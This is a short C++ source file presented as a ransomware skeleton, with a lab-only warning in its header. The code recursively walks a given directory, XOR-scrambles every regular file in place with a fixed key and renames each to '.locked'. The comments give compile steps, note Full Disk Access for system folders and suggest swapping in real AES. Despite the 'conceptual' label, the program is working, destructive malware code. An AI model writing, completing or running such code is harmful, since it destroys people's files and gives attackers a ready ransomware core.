// ============================================================
// ransom_skeleton.cpp — file walk + placeholder encrypt
// (CONCEPTUAL — do NOT run outside isolated lab)
// ------------------------------------------------------------
// Compile: clang++ -O2 -std=c++17 -o ransom ransom_skeleton.cpp
// Note:    Requires Full Disk Access for system dirs; user
//          dirs work without it. Replace toy_xor with
//          CommonCrypto/CCCrypt for real AES.
// ============================================================
#include <filesystem>
#include <fstream>
#include <string>
namespace fs = std::filesystem;

static void toy_xor(std::string& d, unsigned char k) {
    for (auto& c : d) c ^= k;
}

int main(int argc, char** argv) {
    if (argc < 2) return 1;
    for (auto& e : fs::recursive_directory_iterator(argv[1])) {
        if (e.is_regular_file()) {
            std::ifstream in(e.path(), std::ios::binary);
            std::string d((std::istreambuf_iterator<char>(in)), {});
            toy_xor(d, 0x5A);
            std::ofstream out(e.path(), std::ios::binary);
            out << d;
            fs::rename(e.path(), e.path().string() + ".locked");
        }
    }
    return 0;
}
